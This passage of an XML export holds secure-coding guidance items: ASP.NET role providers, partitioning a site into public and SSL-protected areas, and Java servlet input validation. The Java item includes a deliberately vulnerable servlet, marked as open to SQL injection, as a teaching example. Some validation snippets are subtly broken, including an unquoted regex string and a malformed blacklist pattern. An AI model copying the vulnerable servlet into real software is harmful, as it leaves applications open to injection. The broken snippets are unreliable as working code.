&lt;strong&gt;AuthorizationStoreRoleProvider&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;If your application roles are in a SQL Server database, use the &lt;strong&gt;SqlRoleProvider.&lt;/strong&gt;
&lt;/li&gt;&lt;li&gt;If your application uses Windows groups as roles, use the &lt;strong&gt;WindowsTokenRoleProvider&lt;/strong&gt;. Note that this is recommended to be used with Windows Authentication only.
&lt;/li&gt;&lt;li&gt;If your application roles are in a store other than those previously listed, create a custom roles provider inheriting
&lt;strong&gt;RoleProvider&lt;/strong&gt; base class. &lt;/li&gt;&lt;li&gt;Set the &lt;strong&gt;defaultProvider&lt;/strong&gt; attribute on the &amp;lt;&lt;strong&gt;roleManager&lt;/strong&gt;&amp;gt; element to the chosen role provider.
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;To check roles and manage roles, use the Role Manager API (for example &lt;strong&gt;
Roles.IsUserInRole &lt;/strong&gt;and &lt;strong&gt;Roles.CreateRole&lt;/strong&gt;). &lt;/p&gt;
&lt;p&gt;If your application needs role-based authorization, use the following guidelines:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Use role providers to perform role authorization.&lt;/strong&gt;&amp;nbsp; Role providers allow you to load the roles for users without writing and maintaining code.&amp;nbsp; Additionally, the role providers offer a consistent way for you to check the role membership of
 your users, regardless of the underlying data store.&amp;nbsp; Where possible, use one of the supplied roles providers; these include
&lt;strong&gt;SqlRoleProvider&lt;/strong&gt;, &lt;strong&gt;WindowsTokenRoleProvider&lt;/strong&gt;, and &lt;strong&gt;
AuthorizationStoreRoleProvider&lt;/strong&gt;.&amp;nbsp; If you already have a custom role store in a non-SQL Server database or in a non-Active Directory LDAP store, consider implementing your own custom role provider.
&lt;/p&gt;
&lt;p&gt;The following code shows how to use the role manager API and specifically &lt;strong&gt;
Roles.IsUserInRole&lt;/strong&gt;. &lt;/p&gt;
&lt;pre&gt;// Tests whether the currently authenticated user is a member&lt;br&gt;// of a particular role.&lt;br&gt;if(Roles.IsUserInRole(&amp;quot;Manager&amp;quot;))&lt;br&gt;   // Perform restricted operation else&lt;br&gt;   // Return unauthorized access error.&lt;br&gt;// Tests whether any given user is a member of a role:&lt;br&gt;if(Roles.IsUserInRole(&amp;quot;Bob&amp;quot;,&amp;quot;Manager&amp;quot;))&lt;br&gt;   // Perform restricted operation&lt;br&gt;else&lt;br&gt;   // Return unauthorized access error.&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Use the SqlRoleProvider when your roles are in SQL Server.&lt;/strong&gt;&amp;nbsp; If you store role information in SQL Server, configure your application to use the
&lt;strong&gt;SqlRoleProvider&lt;/strong&gt;.&amp;nbsp; You can also configure forms authentication with the
&lt;strong&gt;SqlMembershipProvider&lt;/strong&gt; to use the same database for authentication and authorization, although this is not required.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Use the WindowsTokenRoleProvider when you use Windows groups as roles.&lt;/strong&gt;&amp;nbsp; If your application uses Windows authentication and you use Windows groups as roles, configure your application to use the
&lt;strong&gt;WindowsTokenRoleProvider&lt;/strong&gt;. &lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Use the AuthorizationStoreRoleProvider when your application roles are in ADAM.&lt;/strong&gt;&amp;nbsp; If your application uses Windows authentication against Active Directory, and you need application specific roles instead of using your domain Windows group
 membership, you can store role information in SQL Server or in an Authorization Manager (AzMan) policy store in ADAM.&amp;nbsp; Authorization Manager provides a Microsoft Management Console (MMC) snap-in, to create and manage roles, and to manage role membership for
 users. &lt;/p&gt;
&lt;p&gt;If your user accounts are in Active Directory, but you cannot use Windows authentication and must use forms authentication, a good solution for roles management is to use the
&lt;strong&gt;AuthorizationStoreRoleProvider&lt;/strong&gt; with an AzMan policy store in ADAM.
&lt;/p&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt;&amp;nbsp;&amp;nbsp;The &lt;strong&gt;AuthorizationStoreRoleProvider&lt;/strong&gt; does not directly support Authorization Manager business logic such as operations and tasks. To do this, you must use P/Invoke and call the Authorization Manager API directly.&amp;nbsp;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:572ac2ef-647b-4cba-a976-7c285a6d475f"&gt;&lt;/a&gt;&lt;a href="?#ruledisplay:4c4c6b17-c40f-4710-bd98-03693304ae78"&gt;Role Manager is used for Roles Authorization Rather than Custom Code&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>6e6f83a6-404b-441d-be4c-71f2726a7960</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Separate Public and Restricted Areas</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Authentication</category>
    <phase>Design</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</author>
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;You should Partition your Web Site so that secure pages that require authenticated access are placed in a subdirectory that is separate from the anonymously accessible pages.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;To prevent unauthenticated users from accessing the restricted pages. Any attempt to do so forces a Forms login.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;If your Web application requires users to complete authentication before they can access specific pages, make sure that the restricted pages are placed in a separate directory away from publicly accessible pages.
&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;h3&gt;Separate Public and Restricted Areas&lt;/h3&gt;
&lt;p&gt;A public area of your site can be accessed by any user anonymously. Restricted areas can be accessed only by specific individuals and the users must authenticate with the site. Consider a typical retail Web site. You can browse the product catalog anonymously.
 When you add items to a shopping cart, the application identifies you with a session identifier. Finally, when you place an order, you perform a secure transaction. This requires you to log in to authenticate your transaction over SSL.&lt;/p&gt;
&lt;p&gt;By partitioning your site into public and restricted access areas, you can apply separate authentication and authorization rules across the site and limit the use of SSL. To avoid the unnecessary performance overhead associated with SSL, design your site
 to limit the use of SSL to the areas that require authenticated access.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; If you are using &lt;strong&gt;Server.Transfer&lt;/strong&gt; in your application to transfer from an anonymous page to a secure page, the .NET Framework bypasses authentication checks, so code that uses
&lt;strong&gt;Server.Transfer&lt;/strong&gt; should be verified to ensure that it does not transfer to a secure directory.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Consider Partitioning Your Web Site&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;To avoid having to use SSL across your entire site, structure your Web site so that the secure pages that require authenticated access are placed in a subdirectory that is separate from the anonymously accessible pages. This approach is shown in following
 Figure 1&lt;/p&gt;
&lt;p&gt;&lt;img src="http://msdn2.microsoft.com/en-us/library/ms998310.f01paght00001201(en-us,MSDN.10).gif" style="border:1px solid #000"&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Figure - Visual Studio.NET Solution Explorer showing a partitioned Web site&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In Figure 1, secure pages, including the application's login page, are placed in the
&lt;strong&gt;Secure&lt;/strong&gt; folder beneath the application's virtual root directory. &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;To secure pages in a separate subfolder&lt;/strong&gt; &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;In Microsoft Internet Information Services (IIS), configure the secure folder to require SSL. This sets the
&lt;strong&gt;AccessSSL=true&lt;/strong&gt; attribute for the folder in the IIS Metabase. Requests for pages in the secured folders are successful only if HTTPS is used for the request URL.
&lt;/li&gt;&lt;li&gt;Use an &amp;lt;&lt;strong&gt;authorization&lt;/strong&gt;&amp;gt; element to ensure that only authenticated users can access secure pages. Place this element beneath the closing &amp;lt;&lt;strong&gt;/system.web&lt;/strong&gt;&amp;gt; tag, as shown here.
&lt;div&gt;
&lt;pre&gt;&amp;lt;!-- The secure folder is for authenticated and SSL access only. --&amp;gt;&lt;br&gt;&amp;lt;location path=&amp;quot;Secure&amp;quot; &amp;gt;&lt;br&gt;  &amp;lt;system.web&amp;gt;&lt;br&gt;    &amp;lt;authorization&amp;gt;&lt;br&gt;      &amp;lt;deny users=&amp;quot;?&amp;quot; /&amp;gt;&lt;br&gt;    &amp;lt;/authorization&amp;gt;&lt;br&gt;  &amp;lt;/system.web&amp;gt;&lt;br&gt;&amp;lt;/location&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Additionally, the following configuration ensures that unauthenticated users are allowed to access pages in the application's root directory. Place this configuration in the main &amp;lt;&lt;strong&gt;system.web&lt;/strong&gt;&amp;gt; element.
&lt;/p&gt;
&lt;pre&gt;&amp;lt;system.web&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;!-- The virtual directory root folder contains general pages.&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Unauthenticated users can view them and they do not need &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; to be secured with SSL. --&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;authorization&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;allow users=&amp;quot;*&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;/authorization&amp;gt;&lt;br&gt;&amp;lt;/system.web&amp;gt;&amp;nbsp; &lt;/pre&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;If you use this type of site structure, your application must not rely on the user's identity on the non-SSL pages. In the preceding configuration, no forms authentication ticket is sent for requests for non-SSL pages. As
 a result, the user is considered anonymous. This has implications for related features, such as personalization, that require the user name.&lt;strong&gt;
&lt;/strong&gt;&lt;/blockquote&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information see, &amp;quot;Chapter 4 - Design Guidelines for Secure Web Applications&amp;quot; at
&lt;a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx"&gt;http://msdn2.microsoft.com/en-us/library/aa302420.aspx&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>75bd5893-aa69-4d39-8cc8-004cee54aaae</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Validate Input for Length, Range, Format, and Type</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>1</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Applications written using Servlets or JSP.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Treat all input as untrusted data. Validate untrusted data using whitelist techniques to check against known good input.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Unchecked malicious input may lead to integer overflows, injection based attacks, denial of service or information disclosure.
&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;Always validate input. Do not assume that input is good based on origin.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Input can vary in several ways: length, data type contents. It is recommended to verify that all of these meet your application's expectations regarding its input.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Validating length&lt;/strong&gt;: Validating an input's length suggests that your application should check a string's length or the number of bits in a numeric value. Checking the length can help prevent buffer overflows as well as integer overflows in
 numeric values. A simple way of validating the numeric value can be done through the use of
&lt;strong&gt;BigInteger/BigDecimal&lt;/strong&gt;:&lt;/li&gt;&lt;/ol&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;pre&gt;public boolean validateLength(String input)&lt;br&gt;{&lt;br&gt;      if(validateType(input))&lt;br&gt;      {&lt;br&gt;            BigInteger bi = new BigInteger(input);&lt;br&gt;             if(bi.compareTo(BigInteger.valueOf(0)) &amp;gt; -1&lt;br&gt;               &amp;amp;&amp;amp; bi.compareTo(BigInteger.valueOf(Integer.MAX_VALUE)) &amp;lt; 1)&lt;br&gt;            {&lt;br&gt;                  return true;&lt;br&gt;            }&lt;br&gt;            else&lt;br&gt;            {&lt;br&gt;                  return false;&lt;br&gt;            }&lt;br&gt;      }&lt;br&gt;      else&lt;br&gt;      {&lt;br&gt;             return false;&lt;br&gt;      }&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Validating type&lt;/strong&gt;: Validating the input's data type is important when your application expects a specific non-string parameter. Difference in data type can trigger unhandled exceptions that would throw your application into an unknown state.
 Example for validating that input is of integer value:&lt;/li&gt;&lt;/ol&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;pre&gt;public boolean validateType(String input)&lt;br&gt;{&lt;br&gt;      String goodPattern =\\d&amp;#43;;&lt;br&gt;      Pattern p = Pattern.compile(goodPattern);&lt;br&gt;      Matcher m = p.matcher(input);&lt;br&gt;            if(!m.matches())&lt;br&gt;      {&lt;br&gt;&lt;br&gt;            return false;&lt;br&gt;      }&lt;br&gt;      else&lt;br&gt;      {&lt;br&gt;            return true;&lt;br&gt;      }&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Validating contents&lt;/strong&gt;: Validating the input's contents can be achieved using whitelist and blacklist techniques. The choice between the use of black and white listing is based upon the constraints that are imposed on the input. If the input
 follows a tight structure and format, then your application can use whitelisting alone to weed out malicious input. If there are unknowns about the input, then a combination of black and white listing must be used. In general, use blacklisting as a backup
 to whitelisting. Use a spiral-out approach as input is initially validated using whitelist techniques. When whitelisting cannot validate the input, fall back to blacklisting. If blacklist cannot validate, then discard the input.&lt;br&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;Whitelist: Whitelisting involves the establishment of what is good input to your application. Once good input is defined, your application must compare all input against the established good input. If the input does not resemble good input, your application
 should discard it. This technique can be implemented using regular expressions. Example:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;br&gt;public boolean validateData(String input)&lt;br&gt;{&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; String goodPattern = &amp;quot;(\\w|\\d)&amp;#43;&amp;quot;;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; int goodLength = 10;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if(input.length() &amp;gt; goodLength)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return false;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Pattern p = Pattern.compile(goodPattern);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Matcher m = p.matcher(input);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if(!m.matches())&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return false;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; else&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return true;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;Examples of useful regular expressions: &lt;/p&gt;
&lt;p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Use&lt;/td&gt;
&lt;td&gt;Regular Expression&lt;/td&gt;
&lt;td&gt;Java String&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Valid E-Mail Address&lt;/td&gt;
&lt;td&gt;^\w&amp;#43;(\.|_|-){0,1}\w&amp;#43;@(\w&amp;#43;\.)*\w{3,1024}\.([a-zA-Z]{2}\.){0,1}[a-zA-Z]{2,4}$&lt;/td&gt;
&lt;td&gt;^\\w&amp;#43;(\\.|_|-){0,1}\\w&amp;#43;@(\\w&amp;#43;\\.)*\\w{3,}\\.([a-zA-Z]{2}\\.){0,1}[a-zA-Z]{2,4}$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Alpha-numeric free text&lt;/td&gt;
&lt;td&gt;(\w|\d|\s|;|\?|!|,|\.|-|:)&amp;#43;&lt;/td&gt;
&lt;td&gt;(\\w|\\d|\\s|;|\\?|!|,|\\.|-|:)&amp;#43;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Word characters&lt;/td&gt;
&lt;td&gt;\w&amp;#43;&lt;/td&gt;
&lt;td&gt;\\w&amp;#43;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Numbers&lt;/td&gt;
&lt;td&gt;\d&amp;#43;&lt;/td&gt;
&lt;td&gt;\\d&amp;#43;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Blacklist&lt;/strong&gt;: Blacklisting involves filtering the input for recognized malicious characters or strings. Using the blacklist approach, the goal is to discard all input that contains known bad data. Because this technique relies on searching
 the input for all blacklisted characters and/or strings, it can be quite expensive. Example:&lt;/li&gt;&lt;/ul&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;pre&gt;public boolean validateData(String input)&lt;br&gt;{&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if(input.indexOf(&amp;quot;&amp;lt;&amp;quot;) &amp;gt; -1)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return false;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if(input.indexOf(&amp;quot;&amp;gt;&amp;quot;) &amp;gt; -1)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return false;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if(input.indexOf(&amp;quot;\&amp;quot;&amp;quot;) &amp;gt; -1)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return false;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if(input.indexOf(&amp;quot;\'&amp;quot;) &amp;gt; -1)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return false;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return true;&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; This function only describes what blacklisting is. It does not exhaust the different possible inputs that can be blacklisted in an application. Be aware that blacklisting can also be implemented using regular expressions:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;public boolean validateData(String input)&lt;br&gt;{&lt;br&gt;      String badPattern = &amp;quot;(&amp;lt;|\&amp;quot;|\'|(.*))(&amp;lt;|\&amp;quot;|\'|&amp;gt;).*&amp;quot;;&lt;br&gt;      int goodLength = 10;&lt;br&gt;      if(input.length() &amp;gt; goodLength)&lt;br&gt;      {&lt;br&gt;            return false;&lt;br&gt;      }&lt;br&gt;      Pattern p = Pattern.compile(badPattern);&lt;br&gt;      Matcher m = p.matcher(input);&lt;br&gt;            if(!m.matches())&lt;br&gt;      {&lt;br&gt;            return true;&lt;br&gt;      }&lt;br&gt;      else&lt;br&gt;      {&lt;br&gt;            return false;&lt;br&gt;      }&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code produces a data analysis based on a financial index. Because the code does not validate its input, the application is vulnerable to SQL injection.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;import java.io.*;&lt;br&gt;import java.util.*;&lt;br&gt;import java.lang.*;&lt;br&gt;import javax.servlet.*;&lt;br&gt;import javax.servlet.http.*;&lt;br&gt;import java.util.regex.*;&lt;br&gt; public final class DataAggregator extends HttpServlet&lt;br&gt;{&lt;br&gt;      public void doGet(HttpServletRequest request, HttpServletResponse response)&lt;br&gt;            throws ServletException, IOException&lt;br&gt;      {&lt;br&gt;            PrintWriter out = response.getWriter();&lt;br&gt;            String searchTerm = request.getParameter(&amp;quot;index&amp;quot;);&lt;br&gt;             String retString;&lt;br&gt;             try&lt;br&gt;            {&lt;br&gt;                  // The application does not validate the user-supplied data&lt;br&gt;                  retString = &amp;quot;The queried index \&amp;quot;&amp;quot;;&lt;br&gt;                  retString &amp;#43;= encodeHtml(searchTerm); &lt;br&gt;                  retString &amp;#43;= &amp;quot;\&amp;quot; produced the following results:&amp;lt;br&amp;gt; &amp;quot;;&lt;br&gt;                  out.println(retString);&lt;br&gt;                  common.aggregateData(out, searchTerm);&lt;br&gt;            }&lt;br&gt;             catch (Exception e)&lt;br&gt;            {&lt;br&gt;                  // Add the appropriate logging and exception handling&lt;br&gt;                  // mechanisms. Consult the Exception Handling and&lt;br&gt;                  // Logging sections&lt;br&gt;                  out.println(&amp;quot;We cannot handle your request at the moment.&amp;quot;&lt;br&gt;                            &amp;#43; &amp;quot;Please try again later.&amp;quot;);&lt;br&gt;            }&lt;br&gt;             out.flush();&lt;br&gt;             out.close();&lt;br&gt;      }&lt;br&gt;  }&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The following code produces a data analysis based on a financial index. Since the code validates the application's input, the application is secured from SQL injection.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;import java.io.*;&lt;br&gt;import java.util.*;&lt;br&gt;import java.lang.*;&lt;br&gt;import javax.servlet.*;&lt;br&gt;import javax.servlet.http.*;&lt;br&gt;import java.util.regex.*;&lt;br&gt; public final class DataAggregator extends HttpServlet&lt;br&gt;{&lt;br&gt;      public void doGet(HttpServletRequest request, HttpServletResponse response)&lt;br&gt;            throws ServletException, IOException&lt;br&gt;      {&lt;br&gt;            PrintWriter out = response.getWriter();&lt;br&gt;            String searchTerm = request.getParameter(&amp;quot;index&amp;quot;);&lt;br&gt;             try&lt;br&gt;            {&lt;br&gt;&lt;br&gt;                  // The application validates the user-supplied data&lt;br&gt;                  if (validateSearchTerm(searchTerm))&lt;br&gt;                  {&lt;br&gt;                        String retString;&lt;br&gt;                        retString = &amp;quot;The queried index \&amp;quot;&amp;quot;;&lt;br&gt;                        retString &amp;#43;= encodeHtml(searchTerm);&lt;br&gt;                        retString &amp;#43;= &amp;quot;\&amp;quot; produced the following results:&amp;lt;br&amp;gt; &amp;quot;;&lt;br&gt;                        out.println(retString);&lt;br&gt;                        common.aggregateData(out, searchTerm);&lt;br&gt;                  }&lt;br&gt;                  else&lt;br&gt;                  {&lt;br&gt;                        // Add the appropriate logging and exception handling&lt;br&gt;                        // mechanisms. Consult the Exception Handling and&lt;br&gt;                        // Logging sections&lt;br&gt;                        out.println(&amp;quot;We cannot handle your request at the moment.&amp;quot;&lt;br&gt;                                  &amp;#43; &amp;quot;Please try again later.&amp;quot;);&lt;br&gt;                  }&lt;br&gt;            }&lt;br&gt;             catch (Exception e)&lt;br&gt;            {&lt;br&gt;                   // Add the appropriate logging and exception handling&lt;br&gt;                   // mechanisms. Consult the Exception Handling and&lt;br&gt;                   // Logging sections&lt;br&gt;                   out.println(&amp;quot;We cannot handle your request at the moment.&amp;quot;&lt;br&gt;                           &amp;#43; &amp;quot; Please try again later.&amp;quot;);&lt;br&gt;            }             out.flush();&lt;br&gt;            out.close();&lt;br&gt;      }&lt;br&gt;         boolean validateSearchTerm(String input)&lt;br&gt;      {&lt;br&gt;            String goodPattern = &amp;quot;(\\w|\\d)&amp;#43;&amp;quot;;&lt;br&gt;            int goodLength = 8;&lt;br&gt;             if (input == null)&lt;br&gt;            {&lt;br&gt;                  return false;&lt;br&gt;            }&lt;br&gt;             if(input.length() &amp;gt; goodLength)&lt;br&gt;            {&lt;br&gt;                  return false;&lt;br&gt;            }&lt;br&gt;                        Pattern p = Pattern.compile(goodPattern);&lt;br&gt;            Matcher m = p.matcher(input);&lt;br&gt;                        if(!m.matches())&lt;br&gt;            {&lt;br&gt;                  return false;&lt;br&gt;            }&lt;br&gt;                        return true;&lt;br&gt;      }&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;A tutorial on regular expressions is available at &lt;a href="http://www.regular-expressions.info/"&gt;
Regular-Expressions.info&lt;/a&gt;. &lt;/li&gt;&lt;li&gt;For more information on using regular expression in Java, see: Documentation for
&lt;a href="http://download.oracle.com/javase/1.4.2/docs/api/java/util/regex/Pattern.html"&gt;
Class Pattern&lt;/a&gt; in Java SDK. &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:71225A92-ECA2-481E-ADEE-EA9C222DEA43"&gt;Guideline: Validate Input from All Sources (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:BEC58471-A0EF-40C5-8C9D-9BF5C4B91F1F"&gt;Guideline: Filter All User-Supplied Filename and Path Input (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:2D8158D1-E2D1-459F-9BD7-56D4B979EFE3"&gt;Guideline: Encode All Output Data (Java Web Application)&lt;/a&gt;
